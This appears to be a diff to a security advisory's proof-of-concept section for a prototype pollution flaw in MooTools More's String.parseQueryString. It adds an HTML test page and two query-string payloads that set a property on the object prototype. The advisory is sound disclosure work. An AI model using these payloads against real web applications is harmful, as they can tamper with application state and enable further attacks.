@@ -42,6 +42,14 @@ https://github.com/mootools/mootools-more/blob/687363b141c7d6abb89e6716462bbd995
 ```
 
 ### PoC
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools-more/1.6.0/mootools-more-compressed.js"></script>
+<script>
+  String.parseQueryString(location.search.slice(1))
+</script>
 ```
-String.parseQueryString('__proto__[test]=test')
+```
+?__proto__[test]=test
+?constructor[prototype][test]=test
 ```
